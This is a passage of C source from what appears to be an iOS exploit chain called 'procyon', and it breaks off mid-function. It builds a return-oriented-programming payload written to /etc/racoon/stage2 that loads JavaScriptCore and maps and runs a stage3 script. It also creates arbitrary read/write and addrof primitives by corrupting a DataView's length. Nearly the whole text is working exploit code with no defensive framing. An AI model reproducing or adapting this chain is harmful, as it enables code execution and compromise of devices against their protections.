#include "util.h"
#include "procyon.h"

static uint8_t *stage2_data = NULL;
static uint8_t *stage2_strs = NULL;
static rop_variable_t *rop_variable_list = NULL;
static uint32_t rop_variable_idx = 0;
static uint32_t dsc_slide_addr = 0;
static uint32_t stack_offset = 0;
static uint32_t str_offset = 0;
static uint32_t temp_rw_addr = 0;
static uint32_t js_ctx = 0;
static uint32_t js_global = 0;
static uint32_t js_script_name = 0;
static uint32_t js_script_fd = 0;
static uint32_t js_script = 0;
static uint32_t js_syscall_name_str = 0;
static uint32_t js_syscall_object = 0;
static uint32_t js_exception = 0;
static uint32_t ab_rw_prop = 0;
static uint32_t ab_rw_ctor = 0;
static uint32_t ab_rw_size = 0;
static uint32_t ab_rw_type_str = 0;
static uint32_t ab_rw_name_str = 0;
static uint32_t ab_rw_object = 0;
static uint32_t dv_rw_prop = 0;
static uint32_t dv_rw_ctor = 0;
static uint32_t dv_rw_type_str = 0;
static uint32_t dv_rw_name_str = 0;
static uint32_t dv_rw_object = 0;
static uint32_t arr_addrof_size = 0;
static uint32_t arr_addrof_name_str = 0;
static uint32_t arr_addrof_object = 0;
static uint32_t dv_addrof_prop = 0;
static uint32_t dv_addrof_ctor = 0;
static uint32_t dv_addrof_type_str = 0;
static uint32_t dv_addrof_name_str = 0;
static uint32_t dv_addrof_object = 0;

static uint32_t rop_register_variable(const char *name, uint32_t size) {
    if (rop_variable_idx >= 100) return 0;
    if (rop_variable_list == NULL) {
        rop_variable_list = calloc(1, sizeof(rop_variable_t) * 100);
        if (rop_variable_list == NULL) return 0;
        rop_variable_idx = 0;
    }

    rop_variable_list[rop_variable_idx].name = strdup(name);
    rop_variable_list[rop_variable_idx].size = size + (size % 4);

    if (rop_variable_idx == 0) {
        rop_variable_list[rop_variable_idx].addr = procyon->stage2.stack_varibles;
    } else {
        uint32_t last_addr = rop_variable_list[rop_variable_idx-1].addr;
        uint32_t last_size = rop_variable_list[rop_variable_idx-1].size;
        rop_variable_list[rop_variable_idx].addr = last_addr + last_size;
    }

    uint32_t addr = rop_variable_list[rop_variable_idx].addr;
    rop_variable_idx++;
    return addr;
}

static uint32_t rop_get_variable(const char *name) {
    if (rop_variable_list == NULL || rop_variable_idx >= 100) return 0;
    for (uint32_t i = 0; i < rop_variable_idx; i++) {
        const char *current_name = rop_variable_list[i].name;
        if (current_name == NULL) continue;

        if (strcmp(name, current_name) == 0) {
            return rop_variable_list[i].addr;
        }
    }
    return 0;
}

static uint32_t rop_string(const char *str) {
    char *existing = strnstr((char *)stage2_strs, str, 0x1000);
    if (existing != NULL) return procyon->stage2.stack_strings + ((uintptr_t)existing - (uintptr_t)stage2_strs);
    
    uint32_t len = strlen(str) + 1;
    memcpy(stage2_strs + str_offset, str, len);

    uint32_t addr = procyon->stage2.stack_strings + str_offset;
    str_offset += len;
    return addr;
}

static void rop_add_slide(uint32_t ptr) {
    STATIC_WRITE32(stack_offset+0x0, dsc_slide_addr - 0x4); // r2
    STATIC_WRITE32(stack_offset+0x4, 0); // r3
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.ldr_r1_r2_4_bx_lr)); // pc

    STATIC_WRITE32(stack_offset+0x10, ptr); // r2
    STATIC_WRITE32(stack_offset+0x14, 0); // r3
    STATIC_WRITE32(stack_offset+0x18, 0); // r7
    STATIC_WRITE32(stack_offset+0x1c, DSC_REMAP_ADDR(procyon->gadgets.ldr_r0_r2_bx_lr)); // pc

    STATIC_WRITE32(stack_offset+0x20, 0); // r2
    STATIC_WRITE32(stack_offset+0x24, 0); // r3
    STATIC_WRITE32(stack_offset+0x28, 0); // r7
    STATIC_WRITE32(stack_offset+0x2c, DSC_REMAP_ADDR(procyon->gadgets.add_r0_r1_bx_lr)); // pc

    STATIC_WRITE32(stack_offset+0x30, ptr); // r2
    STATIC_WRITE32(stack_offset+0x34, 0); // r3
    STATIC_WRITE32(stack_offset+0x38, 0); // r7
    STATIC_WRITE32(stack_offset+0x3c, DSC_REMAP_ADDR(procyon->gadgets.str_r0_r2_bx_lr)); // pc
    stack_offset += 0x40;
}

static void rop_add(uint32_t ptr, uint32_t value) {
    STATIC_WRITE32(stack_offset+0x0, ptr); // r2
    STATIC_WRITE32(stack_offset+0x4, 0); // r3
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.ldr_r0_r2_bx_lr)); // pc

    STATIC_WRITE32(stack_offset+0x10, value); // r2
    STATIC_WRITE32(stack_offset+0x14, 0); // r3
    STATIC_WRITE32(stack_offset+0x18, 0); // r7
    STATIC_WRITE32(stack_offset+0x1c, DSC_REMAP_ADDR(procyon->gadgets.add_r0_r2_bx_lr)); // pc

    STATIC_WRITE32(stack_offset+0x20, ptr); // r2
    STATIC_WRITE32(stack_offset+0x24, 0); // r3
    STATIC_WRITE32(stack_offset+0x28, 0); // r7
    STATIC_WRITE32(stack_offset+0x2c, DSC_REMAP_ADDR(procyon->gadgets.str_r0_r2_bx_lr)); // pc
    stack_offset += 0x30;
}

static void rop_move32(uint32_t src, uint32_t dest) {
    STATIC_WRITE32(stack_offset+0x0, src); // r2
    STATIC_WRITE32(stack_offset+0x4, 0); // r3
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.ldr_r0_r2_bx_lr)); // pc

    STATIC_WRITE32(stack_offset+0x10, dest); // r2
    STATIC_WRITE32(stack_offset+0x14, 0); // r3
    STATIC_WRITE32(stack_offset+0x18, 0); // r7
    STATIC_WRITE32(stack_offset+0x1c, DSC_REMAP_ADDR(procyon->gadgets.str_r0_r2_bx_lr)); // pc
    stack_offset += 0x20;
}

static void rop_save_return_value(uint32_t ptr) {
    STATIC_WRITE32(stack_offset+0x0, ptr); // r2
    STATIC_WRITE32(stack_offset+0x4, 0); // r3
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.str_r0_r2_bx_lr)); // pc
    stack_offset += 0x10;
}

static void rop_write32(uint32_t addr, uint32_t value) {
    STATIC_WRITE32(stack_offset+0x0, value); // r2
    STATIC_WRITE32(stack_offset+0x4, addr); // r3
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.str_r2_r3_bx_lr)); // pc
    stack_offset += 0x10;
}

static void rop_slide_write32(uint32_t addr, uint32_t value, bool slide_value) {
    if (slide_value) {
        rop_write32(temp_rw_addr, value);
        rop_add_slide(temp_rw_addr);
        rop_move32(temp_rw_addr, procyon->stage2.stack_base + stack_offset + 0x90);
    }

    rop_write32(temp_rw_addr, addr);
    rop_add_slide(temp_rw_addr);
    rop_move32(temp_rw_addr, procyon->stage2.stack_base + stack_offset + 0x20 + 0x4);

    STATIC_WRITE32(stack_offset+0x0, value); // r2
    STATIC_WRITE32(stack_offset+0x4, 0); // r3 (addr)
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.str_r2_r3_bx_lr)); // pc
    stack_offset += 0x10;
}

static void rop_saved_write32(uint32_t addr, uint32_t offset, uint32_t value) {
    if (offset == 0) {
        rop_move32(addr, procyon->stage2.stack_base + stack_offset + 0x20 + 0x4);
        STATIC_WRITE32(stack_offset+0x0, value); // r2
        STATIC_WRITE32(stack_offset+0x4, 0); // r3 (addr)
        STATIC_WRITE32(stack_offset+0x8, 0); // r7
        STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.str_r2_r3_bx_lr)); // pc
        stack_offset += 0x10;
    } else {
        rop_move32(addr, temp_rw_addr);
        rop_add(temp_rw_addr, offset);
        rop_move32(temp_rw_addr, procyon->stage2.stack_base + stack_offset + 0x20 + 0x4);

        STATIC_WRITE32(stack_offset+0x0, value); // r2
        STATIC_WRITE32(stack_offset+0x4, 0); // r3 (addr)
        STATIC_WRITE32(stack_offset+0x8, 0); // r7
        STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.str_r2_r3_bx_lr)); // pc
        stack_offset += 0x10;
    }
}

static void rop_read32(uint32_t addr) {
    STATIC_WRITE32(stack_offset+0x0, addr); // r2
    STATIC_WRITE32(stack_offset+0x4, 0); // r3
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.ldr_r0_r2_bx_lr)); // pc
    stack_offset += 0x10;
}

static void rop_reset(void) {
    STATIC_WRITE32(stack_offset+0x0, 0); // r2
    STATIC_WRITE32(stack_offset+0x4, 0); // r3
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.pop_lr_pc)); // pc

    // 'reset' lr and pc
    STATIC_WRITE32(stack_offset+0x10, DSC_REMAP_ADDR(procyon->gadgets.pop_r2_r3_r7_pc)); // lr
    STATIC_WRITE32(stack_offset+0x14, DSC_REMAP_ADDR(procyon->gadgets.pop_r2_r3_r7_pc)); // pc
    stack_offset += 0x18;
}

static void rop_syscall8(int sys_num, uint32_t a1, uint32_t a2, uint32_t a3, uint32_t a4, uint32_t a5, uint32_t a6, uint32_t a7, uint32_t a8) {
    STATIC_WRITE32(stack_offset+0x0, 0); // r2
    STATIC_WRITE32(stack_offset+0x4, 0); // r3
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.pop_r12_pc)); // pc

    STATIC_WRITE32(stack_offset+0x10, sys_num); // r12
    STATIC_WRITE32(stack_offset+0x14, DSC_REMAP_ADDR(procyon->gadgets.pop_r4_r5_r6_r7_pc)); // pc

    STATIC_WRITE32(stack_offset+0x18, 0); // r4 (clobber)
    STATIC_WRITE32(stack_offset+0x1c, a8); // r5
    STATIC_WRITE32(stack_offset+0x20, a8); // r6
    STATIC_WRITE32(stack_offset+0x24, a8); // r7
    STATIC_WRITE32(stack_offset+0x28, DSC_REMAP_ADDR(procyon->gadgets.pop_r0_r1_r2_r3_r4_pc)); // pc

    STATIC_WRITE32(stack_offset+0x2c, a1); // r0
    STATIC_WRITE32(stack_offset+0x30, a2); // r1
    STATIC_WRITE32(stack_offset+0x34, a3); // r2
    STATIC_WRITE32(stack_offset+0x38, a4); // r3
    STATIC_WRITE32(stack_offset+0x3c, a5); // r4
    STATIC_WRITE32(stack_offset+0x40, DSC_REMAP_ADDR(procyon->gadgets.svc_0x80_bx_lr)); // pc
    stack_offset += 0x44;
}

static void rop_exit(int value) {
    rop_syscall8(SYS_exit, value, 0, 0, 0, 0, 0, 0, 0);
}

static void rop_open(uint32_t path_addr, uint32_t flags) {
    rop_syscall8(SYS_open, path_addr, flags, 0, 0, 0, 0, 0, 0);
}

static void rop_mmap(uint32_t addr, uint32_t size, uint32_t prot, uint32_t flags, uint32_t fd_addr, uint32_t offset) {
    rop_move32(fd_addr, procyon->stage2.stack_base + stack_offset + 0x20 + 0x3c);
    rop_syscall8(SYS_mmap, addr, size, prot, flags, 0, offset, 0, 0);
}

static void rop_close(uint32_t fd_addr) {
    rop_move32(fd_addr, procyon->stage2.stack_base + stack_offset + 0x20 + 0x2c);
    rop_syscall8(SYS_close, 0, 0, 0, 0, 0, 0, 0, 0);
}

static void rop_dlopen(uint32_t path_addr, int mode) {
    rop_add_slide(procyon->stage2.stack_base + stack_offset + 0x40 + 0x18);
    STATIC_WRITE32(stack_offset+0x0, 0); // r2
    STATIC_WRITE32(stack_offset+0x4, 0); // r3
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.pop_r0_r1_pc)); // pc

    STATIC_WRITE32(stack_offset+0x10, path_addr); // r0 (path moved here)
    STATIC_WRITE32(stack_offset+0x14, mode); // r1
    STATIC_WRITE32(stack_offset+0x18, procyon->symbols.dlopen); // pc (dlopen)

    stack_offset += 0x1c;
    rop_reset();
}

static void rop_js_context_create(uint32_t save_addr) {
    rop_add_slide(procyon->stage2.stack_base + stack_offset + 0x40 + 0x18);
    STATIC_WRITE32(stack_offset+0x0, 0); // r2
    STATIC_WRITE32(stack_offset+0x4, 0); // r3
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.pop_r0_r1_pc)); // pc

    STATIC_WRITE32(stack_offset+0x10, 0); // r0
    STATIC_WRITE32(stack_offset+0x14, 0); // r1
    STATIC_WRITE32(stack_offset+0x18, procyon->symbols.JSGlobalContextCreate); // pc (JSGlobalContextCreate)
    stack_offset += 0x1c;

    rop_reset();
    rop_save_return_value(save_addr);
}

static void rop_js_context_get_global(uint32_t save_addr, uint32_t ctx_addr) {
    rop_add_slide(procyon->stage2.stack_base + stack_offset + 0x60 + 0x18);
    rop_move32(ctx_addr, procyon->stage2.stack_base + stack_offset + 0x20 + 0x10);

    STATIC_WRITE32(stack_offset+0x0, 0); // r2
    STATIC_WRITE32(stack_offset+0x4, 0); // r3
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.pop_r0_r1_pc)); // pc

    STATIC_WRITE32(stack_offset+0x10, 0); // r0
    STATIC_WRITE32(stack_offset+0x14, 0); // r1
    STATIC_WRITE32(stack_offset+0x18, procyon->symbols.JSContextGetGlobalObject); // pc (JSContextGetGlobalObject)
    stack_offset += 0x1c;

    rop_reset();
    rop_save_return_value(save_addr);
}

static void rop_js_string_create(uint32_t save_addr, uint32_t str_addr) {
    rop_add_slide(procyon->stage2.stack_base + stack_offset + 0x40 + 0x18);
    STATIC_WRITE32(stack_offset+0x0, 0); // r2
    STATIC_WRITE32(stack_offset+0x4, 0); // r3
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.pop_r0_r1_pc)); // pc

    STATIC_WRITE32(stack_offset+0x10, str_addr); // r0
    STATIC_WRITE32(stack_offset+0x14, 0); // r1
    STATIC_WRITE32(stack_offset+0x18, procyon->symbols.JSStringCreateWithUTF8CString); // pc (JSStringCreateWithUTF8CString)
    stack_offset += 0x1c;

    rop_reset();
    rop_save_return_value(save_addr);
}

static void rop_js_set_property(uint32_t ctx_addr, uint32_t global_addr, uint32_t name_addr, uint32_t object_addr) {
    rop_add_slide(procyon->stage2.stack_base + stack_offset + 0xC0 + 0x18);
    rop_move32(ctx_addr, procyon->stage2.stack_base + stack_offset + 0x80 + 0x10);
    rop_move32(global_addr, procyon->stage2.stack_base + stack_offset + 0x60 + 0x14);
    rop_move32(name_addr, procyon->stage2.stack_base + stack_offset + 0x40 + 0x0);
    rop_move32(object_addr, procyon->stage2.stack_base + stack_offset + 0x20 + 0x4);

    STATIC_WRITE32(stack_offset+0x0, 0); // r2 (name)
    STATIC_WRITE32(stack_offset+0x4, 0); // r3 (object)
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.pop_r0_r1_pc)); // pc

    STATIC_WRITE32(stack_offset+0x10, 0); // r0 (ctx)
    STATIC_WRITE32(stack_offset+0x14, 0); // r1 (global)
    STATIC_WRITE32(stack_offset+0x18, procyon->symbols.JSObjectSetProperty); // pc (JSObjectSetProperty)

    stack_offset += 0x1c;
    rop_reset();
}

static void rop_js_get_property(uint32_t save_addr, uint32_t ctx_addr, uint32_t global_addr, uint32_t name_addr) {
    rop_add_slide(procyon->stage2.stack_base + stack_offset + 0xa0 + 0x18);
    rop_move32(name_addr, procyon->stage2.stack_base + stack_offset + 0x60 + 0x0);
    rop_move32(ctx_addr, procyon->stage2.stack_base + stack_offset + 0x40 + 0x10);
    rop_move32(global_addr, procyon->stage2.stack_base + stack_offset + 0x20 + 0x14);

    STATIC_WRITE32(stack_offset+0x0, 0); // r2 (name)
    STATIC_WRITE32(stack_offset+0x4, 0); // r3 (exception)
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.pop_r0_r1_pc)); // pc

    STATIC_WRITE32(stack_offset+0x10, 0); // r0 (ctx)
    STATIC_WRITE32(stack_offset+0x14, 0); // r1 (global)
    STATIC_WRITE32(stack_offset+0x18, procyon->symbols.JSObjectGetProperty); // pc (JSObjectGetProperty)
    stack_offset += 0x1c;

    rop_reset();
    rop_save_return_value(save_addr);
}

static void rop_js_value_to_object(uint32_t save_addr, uint32_t ctx_addr, uint32_t value_addr) {
    rop_add_slide(procyon->stage2.stack_base + stack_offset + 0x80 + 0x18);
    rop_move32(ctx_addr, procyon->stage2.stack_base + stack_offset + 0x40 + 0x10);
    rop_move32(value_addr, procyon->stage2.stack_base + stack_offset + 0x20 + 0x14);

    STATIC_WRITE32(stack_offset+0x0, 0); // r2 (exception)
    STATIC_WRITE32(stack_offset+0x4, 0); // r3
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.pop_r0_r1_pc)); // pc

    STATIC_WRITE32(stack_offset+0x10, 0); // r0 (ctx)
    STATIC_WRITE32(stack_offset+0x14, 0); // r1 (value)
    STATIC_WRITE32(stack_offset+0x18, procyon->symbols.JSValueToObject); // pc (JSValueToObject)
    stack_offset += 0x1c;

    rop_reset();
    rop_save_return_value(save_addr);
}

static void rop_js_number_create(uint32_t save_addr, uint32_t ctx_addr, double value) {
    rop_add_slide(procyon->stage2.stack_base + stack_offset + 0x60 + 0x18);
    rop_move32(ctx_addr, procyon->stage2.stack_base + stack_offset + 0x20 + 0x10);
    f64_u32_t convert = {0};
    convert.f64 = value;

    STATIC_WRITE32(stack_offset+0x0, convert.u32.hi); // r2 (value - hi)
    STATIC_WRITE32(stack_offset+0x4, 0); // r3
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.pop_r0_r1_pc)); // pc

    STATIC_WRITE32(stack_offset+0x10, 0); // r0 (ctx)
    STATIC_WRITE32(stack_offset+0x14, convert.u32.lo); // r1 (value - lo)
    STATIC_WRITE32(stack_offset+0x18, procyon->symbols.JSValueMakeNumber); // pc (JSValueMakeNumber)
    stack_offset += 0x1c;

    rop_reset();
    rop_save_return_value(save_addr);
}

static void rop_js_call_ctor(uint32_t save_addr, uint32_t ctx_addr, uint32_t object_addr, uint32_t arg_addr) {
    rop_add_slide(procyon->stage2.stack_base + stack_offset + 0x80 + 0x18);
    rop_move32(ctx_addr, procyon->stage2.stack_base + stack_offset + 0x40 + 0x10);
    rop_move32(object_addr, procyon->stage2.stack_base + stack_offset + 0x20 + 0x14);

    STATIC_WRITE32(stack_offset+0x0, (arg_addr == 0 ? 0 : 1)); // r2 (argumentCount)
    STATIC_WRITE32(stack_offset+0x4, arg_addr); // r3 (arguments)
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.pop_r0_r1_pc)); // pc

    STATIC_WRITE32(stack_offset+0x10, 0); // r0 (ctx)
    STATIC_WRITE32(stack_offset+0x14, 0); // r1 (object)
    STATIC_WRITE32(stack_offset+0x18, procyon->symbols.JSObjectCallAsConstructor); // pc (JSObjectCallAsConstructor)
    stack_offset += 0x1c;

    rop_reset();
    rop_save_return_value(save_addr);
}

static void rop_js_array_create(uint32_t save_addr, uint32_t ctx_addr, uint32_t arg_addr) {
    rop_add_slide(procyon->stage2.stack_base + stack_offset + 0x60 + 0x18);
    rop_move32(ctx_addr, procyon->stage2.stack_base + stack_offset + 0x20 + 0x10);

    STATIC_WRITE32(stack_offset+0x0, arg_addr); // r2 (arguments)
    STATIC_WRITE32(stack_offset+0x4, 0); // r3 (exception)
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.pop_r0_r1_pc)); // pc

    STATIC_WRITE32(stack_offset+0x10, 0); // r0 (ctx)
    STATIC_WRITE32(stack_offset+0x14, 1); // r1 (argumentCount)
    STATIC_WRITE32(stack_offset+0x18, procyon->symbols.JSObjectMakeArray); // pc (JSObjectMakeArray)
    stack_offset += 0x1c;

    rop_reset();
    rop_save_return_value(save_addr);
}

static void rop_js_evaluate_script(uint32_t ctx_addr, uint32_t global_addr, uint32_t name_addr, uint32_t script_addr) {
    rop_add_slide(procyon->stage2.stack_base + stack_offset + 0x40 + 0x80 + 0x18);
    rop_move32(global_addr, procyon->stage2.stack_base + stack_offset + 0x80 + 0x0);
    rop_move32(name_addr, procyon->stage2.stack_base + stack_offset + 0x60 + 0x4);
    rop_move32(ctx_addr, procyon->stage2.stack_base + stack_offset + 0x40 + 0x10);
    rop_move32(script_addr, procyon->stage2.stack_base + stack_offset + 0x20 + 0x14);

    STATIC_WRITE32(stack_offset+0x0, 0x0); // r2 (global)
    STATIC_WRITE32(stack_offset+0x4, 0x0); // r3 (name)
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.pop_r0_r1_pc)); // pc

    STATIC_WRITE32(stack_offset+0x10, 0x0); // r0 (ctx)
    STATIC_WRITE32(stack_offset+0x14, 0x0); // r1 (script)
    STATIC_WRITE32(stack_offset+0x18, procyon->symbols.JSEvaluateScript); // pc (JSEvaluateScript)
    stack_offset += 0x1c;

    STATIC_WRITE32(stack_offset+0x0, 1); // sp+0x0 (arg5)
    STATIC_WRITE32(stack_offset+0x4, js_exception); // sp+0x4 (arg6)

    // reset lr and pc
    STATIC_WRITE32(stack_offset+0x8, DSC_REMAP_ADDR(procyon->gadgets.pop_r2_r3_r7_pc)); // lr
    STATIC_WRITE32(stack_offset+0xc, js_exception); // pc
    stack_offset += 0x10;
}

static void rop_repair_data(void) {
    // repair platform_memmove ptr
    STATIC_WRITE32(0x30, procyon->symbols.platform_memmove); 
    STATIC_WRITE32(0x34, procyon->symbols.platform_memmove_lazy_ptr);
    rop_add_slide(procyon->stage2.stack_base + 0x30);
    rop_add_slide(procyon->stage2.stack_base + 0x34);

    STATIC_WRITE32(stack_offset+0x0, procyon->stage2.stack_base + 0x30); // r2
    STATIC_WRITE32(stack_offset+0x4, 0); // r3
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.ldr_r0_r2_bx_lr)); // pc

    STATIC_WRITE32(stack_offset+0x10, procyon->stage2.stack_base + 0x30); // r2
    STATIC_WRITE32(stack_offset+0x14, 0); // r3
    STATIC_WRITE32(stack_offset+0x18, 0); // r7
    STATIC_WRITE32(stack_offset+0x1c, DSC_REMAP_ADDR(procyon->gadgets.ldr_r1_r2_4_bx_lr)); // pc

    STATIC_WRITE32(stack_offset+0x20, 0); // r2
    STATIC_WRITE32(stack_offset+0x24, 0); // r3
    STATIC_WRITE32(stack_offset+0x28, 0); // r7
    STATIC_WRITE32(stack_offset+0x2c, DSC_REMAP_ADDR(procyon->gadgets.str_r0_r1_bx_lr)); // pc
    stack_offset += 0x30;
    
    // repair all of jsc's __DATA_CONST segment (if needed)
    if (procyon->stage2.repair_start != 0) {
        uint32_t size = procyon->stage2.repair_end - procyon->stage2.repair_start;

        for (uint32_t offset = 0; offset <= size; offset+=0x1000) {
            uint32_t value = *(uint32_t *)(procyon->stage2.repair_local + procyon->stage2.repair_offset + offset);
            uint32_t dest = procyon->stage2.repair_start + procyon->stage2.repair_offset + offset;

            if (value >= procyon->dsc.region_base && value < (procyon->dsc.region_base + procyon->dsc.region_size)) {
                rop_slide_write32(dest, value - procyon->dsc.info->slide, true);
            } else {
                rop_slide_write32(dest, value, false);
            }
        }
    }
}

int gen_stage2(void) {
    int fd = open("/etc/racoon/stage2", O_RDWR|O_CREAT, 0777);
    if (fd < 0) {
        print_log(true, "[-] failed to create /etc/racoon/stage2\n");
        return -1;
    }

    stage2_data = calloc(1, 0x80000);
    bzero(stage2_data, 0x80000); // just to be sure...

    // setup variables, strings, etc
    dsc_slide_addr = procyon->stage1.stack_base + 0x4;
    stage2_strs = stage2_data + (procyon->stage2.stack_strings - procyon->stage2.stack_base);
    temp_rw_addr = rop_register_variable("temp_rw_addr", 0x4);

    js_ctx = rop_register_variable("js_ctx", 0x4);
    js_global = rop_register_variable("js_global", 0x4);
    js_script = rop_register_variable("js_script", 0x4);
    js_script_name = rop_register_variable("js_script_name", 0x4);
    js_script_fd = rop_register_variable("js_script_fd", 0x4);
    js_syscall_name_str = rop_register_variable("js_syscall_name_str", 0x4);
    js_syscall_object = rop_register_variable("js_syscall_object", 0x4);
    js_exception = rop_register_variable("js_exception", 0x4);

    ab_rw_prop = rop_register_variable("ab_rw_prop", 0x4);
    ab_rw_ctor = rop_register_variable("ab_rw_ctor", 0x4);
    ab_rw_size = rop_register_variable("ab_rw_size", 0x4);
    ab_rw_type_str = rop_register_variable("ab_rw_type_str", 0x4);
    ab_rw_name_str = rop_register_variable("ab_rw_name_str", 0x4);
    ab_rw_object = rop_register_variable("ab_rw_object", 0x4);

    dv_rw_prop = rop_register_variable("dv_rw_prop", 0x4);
    dv_rw_ctor = rop_register_variable("dv_rw_ctor", 0x4);
    dv_rw_type_str = rop_register_variable("dv_rw_type_str", 0x4);
    dv_rw_name_str = rop_register_variable("dv_rw_name_str", 0x4);
    dv_rw_object = rop_register_variable("dv_rw_object", 0x4);

    arr_addrof_size = rop_register_variable("arr_addrof_size", 0x4);
    arr_addrof_name_str = rop_register_variable("arr_addrof_name_str", 0x4);
    arr_addrof_object = rop_register_variable("arr_addrof_object", 0x4);

    dv_addrof_prop = rop_register_variable("dv_addrof_prop", 0x4);
    dv_addrof_ctor = rop_register_variable("dv_addrof_ctor", 0x4);
    dv_addrof_type_str = rop_register_variable("dv_addrof_type_str", 0x4);
    dv_addrof_name_str = rop_register_variable("dv_addrof_name_str", 0x4);
    dv_addrof_object = rop_register_variable("dv_addrof_object", 0x4);


    // setup longjmp 
    STATIC_WRITE32(0x0, 0x41414141); // r4
    STATIC_WRITE32(0x4, 0x42424242); // r5
    STATIC_WRITE32(0x8, 0x43434343); // r6
    STATIC_WRITE32(0xc, 0x44444444); // r7
    STATIC_WRITE32(0x10, 0x45454545); // r8
    STATIC_WRITE32(0x14, 0x46464646); // r10
    STATIC_WRITE32(0x18, 0x47474747); // r11
    STATIC_WRITE32(0x1c, procyon->stage2.stack_base + 0x20000); // sp
    STATIC_WRITE32(0x20, DSC_REMAP_ADDR(procyon->gadgets.pop_r2_r3_r7_pc)); // lr
    stack_offset = 0x20000;

    // repair platform_memmove and jsc data
    rop_repair_data();

    // setup jsc and stage3
    rop_dlopen(rop_string("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"), RTLD_NOW);
    rop_js_context_create(js_ctx);
    rop_js_context_get_global(js_global, js_ctx);

    rop_open(rop_string("/var/root/procyon/stage3.bin"), O_RDONLY);
    rop_save_return_value(js_script_fd);
    rop_mmap(procyon->stage3.mapping_base, procyon->stage3.mapping_size, PROT_READ, MAP_FILE | MAP_PRIVATE | MAP_FIXED, js_script_fd, 0);

    rop_js_string_create(js_script, procyon->stage3.mapping_base);
    rop_js_string_create(js_script_name, rop_string("haxx"));

    // create rw prim for jsc
    rop_js_string_create(ab_rw_type_str, rop_string("ArrayBuffer"));
    rop_js_string_create(ab_rw_name_str, rop_string("ab_rw"));
    rop_js_get_property(ab_rw_prop, js_ctx, js_global, ab_rw_type_str);
    rop_js_value_to_object(ab_rw_ctor, js_ctx, ab_rw_prop);
    rop_js_number_create(ab_rw_size, js_ctx, 0x1000);
    rop_js_call_ctor(ab_rw_object, js_ctx, ab_rw_ctor, ab_rw_size);
    rop_js_set_property(js_ctx, js_global, ab_rw_name_str, ab_rw_object);

    rop_js_string_create(dv_rw_type_str, rop_string("DataView"));
    rop_js_string_create(dv_rw_name_str, rop_string("dv_rw"));
    rop_js_get_property(dv_rw_prop, js_ctx, js_global, dv_rw_type_str);
    rop_js_value_to_object(dv_rw_ctor, js_ctx, dv_rw_prop);
    rop_js_call_ctor(dv_rw_object, js_ctx, dv_rw_ctor, ab_rw_object);
    rop_js_set_property(js_ctx, js_global, dv_rw_name_str, dv_rw_object);

    rop_saved_write32(dv_rw_object, procyon->offsets.data_view.array_buffer, 0);
    rop_saved_write32(dv_rw_object, procyon->offsets.data_view.byte_length, 0xffffffff);
    rop_saved_write32(dv_rw_object, procyon->offsets.data_view.mode, 0);


    // create addrof prim for jsc
    rop_js_string_create(arr_addrof_name_str, rop_string("arr_addrof"));
    rop_js_number_create(arr_addrof_size, js_ctx, 1337);
    rop_js_array_create(arr_addrof_object, js_ctx, arr_addrof_size);
    rop_js_set_property(js_ctx, js_global, arr_addrof_name_str, arr_addrof_object);

    rop_js_string_create(dv_addrof_type_str, rop_string("DataView"));
    rop_js_string_create(dv_addrof_name_str, rop_string("dv_addrof"));
    rop_js_get_property(dv_addrof_prop, js_ctx, js_global, dv_addrof_type_str);
    rop_js_value_to_object(dv_addrof_ctor, js_ctx, dv_addrof_prop);
    rop_js_call_ctor(dv_addrof_object, js_ctx, dv_addrof_ctor, ab_rw_object);
